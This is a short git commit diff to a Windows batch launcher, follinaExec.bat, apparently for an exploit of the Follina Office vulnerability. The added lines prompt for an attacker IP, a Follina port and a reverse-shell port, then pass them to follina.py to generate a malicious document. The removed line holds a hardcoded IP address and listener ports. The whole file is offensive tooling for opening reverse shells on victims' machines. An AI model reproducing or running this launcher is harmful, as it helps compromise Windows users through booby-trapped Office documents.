9dc784527f475d8e5ce0efdec2c5cb583222e7ea
Domenico <domenico2727@gmail.com>
2022-06-06 13:30:41 -0400

    added batch

--- follinaExec.bat
+++ follinaExec.bat
@@ -1,3 +1,8 @@
 @echo off
+@echo Please enter the required info
+set /p MYIP="IP Address: "
+set /p PORT="Follina Port: "
+set /p REVERSE="Reverse shell port: "
 del follina.doc
-py follina.py -i 174.93.246.201 --port 25565 -r 8080
+py follina.py -i %MYIP% --port %PORT% -r %REVERSE%
+pause
